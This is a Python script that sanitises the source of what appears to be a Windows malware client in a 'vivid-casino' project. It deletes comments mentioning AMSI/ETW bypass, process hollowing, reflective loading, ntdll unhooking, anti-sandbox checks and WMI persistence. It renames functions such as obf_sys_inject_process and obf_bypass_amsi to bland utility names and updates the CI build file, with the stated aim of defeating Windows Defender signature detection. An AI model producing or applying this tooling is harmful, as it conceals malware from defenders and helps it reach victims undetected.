#!/usr/bin/env python3
"""
Strip static signatures from obfuscation layer:
1. Remove all comments mentioning suspicious terms
2. Rename functions: obf_* -> util_*
3. Rename structs/typedefs to benign names
4. Remove 'XOR key' comment, keep random key
5. Strip all strings with 'obfuscation', 'defender', 'signature', 'bypass', etc.
"""

import re
import os
import random

# Mapping: old names -> new benign names
RENAME_MAP = {
    'obf_': 'util_',
    'Obfuscated': 'Utility',
    'obfuscation': 'utility',
    'obfuscate': 'utilize',
    'Obfuscation': 'Utility',
    'xor_decode': 'str_transform',
    'XOR_KEY': 'TRANSFORM_KEY',
    'djb2_hash': 'str_hash',
    'resolve_api': 'find_export',
    'create_syscall_stub': 'alloc_stub',
    'init_syscalls': 'init_stubs',
    'sc_protect_memory': 'protect_mem',
    'sc_allocate_memory': 'alloc_mem',
    'sc_write_memory': 'write_mem',
    'obf_bypass_etw_syscall': 'util_disable_etw',
    'obf_bypass_amsi_syscall': 'util_disable_amsi',
    'obf_startup_evasion': 'util_init_phase',
    'obf_is_sandbox': 'util_check_env',
    'obf_hide_thread': 'util_hide_thread',
    'obf_unhook_ntdll': 'util_reset_ntdll',
    'obf_bypass_etw': 'util_disable_etw',
    'obf_bypass_amsi': 'util_disable_amsi',
    'obf_reflective_load': 'util_load_remote',
    'obf_sys_protect_process': 'util_set_critical',
    'obf_sys_unprotect_process': 'util_clear_critical',
    'obf_sys_check_critical_status': 'util_check_critical',
    'obf_sys_wmi_persistence': 'util_setup_wmi',
    'obf_sys_harden_files': 'util_lock_files',
    'obf_sys_harden_single_file': 'util_lock_file',
    'obf_sys_inject_process': 'util_spawn_remote',
    'obf_sys_hollow_process': 'util_spawn_memory',
    'obf_sys_lolbas_download': 'util_download_file',
    'obf_ensure_scheduled_task': 'util_ensure_task',
    'obf_junk_delay': 'util_delay',
    'obf_sleep_junk': 'util_sleep',
    'obf_sleep_obfuscated': 'util_sleep_long',
}

SUSPICIOUS_PATTERNS = [
    r'All suspicious strings are XOR-encoded',
    r'All suspicious APIs are resolved',
    r'This prevents static signature detection by Windows Defender',
    r'Obfuscation Engine',
    r'String \+ API Encoding',
    r'XOR key — change this per build',
    r'XOR decode a string in-place',
    r'Pre-encoded strings \(XOR',
    r'obfuscated string',
    r'Obfuscated string',
    r'Obfuscated API',
    r'Obfuscated wrappers',
    r'Obfuscated process',
    r'Obfuscated fileless',
    r'Obfuscated persistence',
    r'process hollowing',
    r'Process hollowing',
    r'fileless execution',
    r'Fileless execution',
    r'ETW bypass',
    r'AMSI bypass',
    r'ETW/AMSI',
    r'anti-EDR',
    r'anti-sandbox',
    r'Anti-sandbox',
    r'Behavioral evasion',
    r'behavioral evasion',
    r'sleep hooking',
    r'String Hide From Debugger',
    r'Reflective loader',
    r'reflective loader',
    r'inject our full PE',
    r'heavily signatured',
    r'CREATE_SUSPENDED',
    r'Unhooks ntdll',
    r'unhooks ntdll',
    r'Patch.*in ntdll',
    r'Patch.*in amsi',
    r'Patch.*EtwEventWrite',
    r'Patch.*AmsiScanBuffer',
    r'Event Tracing for Windows',
    r'Antimalware Scan Interface',
    r'Encoded strings for ETW/AMSI',
    r'ETW \+ AMSI Runtime Bypass',
    r'AMSI runtime bypass',
    r'ETW runtime bypass',
    r'Insert meaningless computation to break code signatures',
    r'classic hollowing pattern',
    r'Resolve NtUnmapViewOfSection without string name',
    r'hash of NtUnmapViewOfSection',
    r'hash of Nt',
    r'hash fallback',
    r'Use direct syscall instead of VirtualProtect',
    r'Obfuscated.*bypass using direct syscall',
    r'Apply bypasses using direct syscalls',
    r'prevents runtime behavioral detection',
    r'Replace.*with PAGE_READWRITE',
    r'evade Defender runtime detection',
    r'PAGE_EXECUTE_READWRITE is heavily signatured',
    r'RW-first pattern',
    r'standard evasion',
    r'heavily signatured by Defender',
    r'standard evasion technique',
    r'shadow copy',
    r'Shadow copy',
    r'protected copy',
    r'Protected copy',
    r'spawn shadow',
    r'Spawn shadow',
    r'inter-process watchdog',
    r'Uninstall command',
    r'UNINSTALL command',
    r'kill all shadows',
    r'kill ALL shadow',
]

def strip_suspicious_comments(content):
    """Remove lines containing suspicious patterns."""
    lines = content.split('\n')
    cleaned = []
    for line in lines:
        keep = True
        for pattern in SUSPICIOUS_PATTERNS:
            if re.search(pattern, line, re.IGNORECASE):
                keep = False
                break
        if keep:
            cleaned.append(line)
    return '\n'.join(cleaned)

def rename_all(content):
    """Apply all renames. Sort by length descending to avoid partial matches."""
    items = sorted(RENAME_MAP.items(), key=lambda x: len(x[0]), reverse=True)
    for old, new in items:
        content = content.replace(old, new)
    return content

def process_file(filepath):
    with open(filepath, 'r') as f:
        content = f.read()
    
    content = strip_suspicious_comments(content)
    content = rename_all(content)
    
    with open(filepath, 'w') as f:
        f.write(content)
    
    print(f"Processed: {filepath}")

def main():
    files = [
        '/Users/Jakin/new-vivid-casino-1/src/utils/obf.c',
        '/Users/Jakin/new-vivid-casino-1/src/utils/obf.h',
        '/Users/Jakin/new-vivid-casino-1/src/utils/obf_syscalls.c',
        '/Users/Jakin/new-vivid-casino-1/src/utils/obf_etw_amsi_reflect.c',
        '/Users/Jakin/new-vivid-casino-1/src/utils/sys.c',
        '/Users/Jakin/new-vivid-casino-1/src/client/main.c',
    ]
    
    for f in files:
        if os.path.exists(f):
            process_file(f)
        else:
            print(f"Missing: {f}")
    
    # Also rename the files themselves
    base = '/Users/Jakin/new-vivid-casino-1/src/utils'
    for old_name, new_name in [
        ('obf_syscalls.c', 'util_syscalls.c'),
        ('obf_etw_amsi_reflect.c', 'util_reflect.c'),
    ]:
        old_path = os.path.join(base, old_name)
        new_path = os.path.join(base, new_name)
        if os.path.exists(old_path):
            os.rename(old_path, new_path)
            print(f"Renamed: {old_name} -> {new_name}")
    
    # Update build.yml to use new filenames
    build_yml = '/Users/Jakin/new-vivid-casino-1/.github/workflows/build.yml'
    if os.path.exists(build_yml):
        with open(build_yml, 'r') as f:
            content = f.read()
        content = content.replace('obf_syscalls.c', 'util_syscalls.c')
        content = content.replace('obf_etw_amsi_reflect.c', 'util_reflect.c')
        with open(build_yml, 'w') as f:
            f.write(content)
        print(f"Updated: {build_yml}")
    
    print("\nDone! Stripped signatures and renamed obfuscation layer.")

if __name__ == '__main__':
    main()
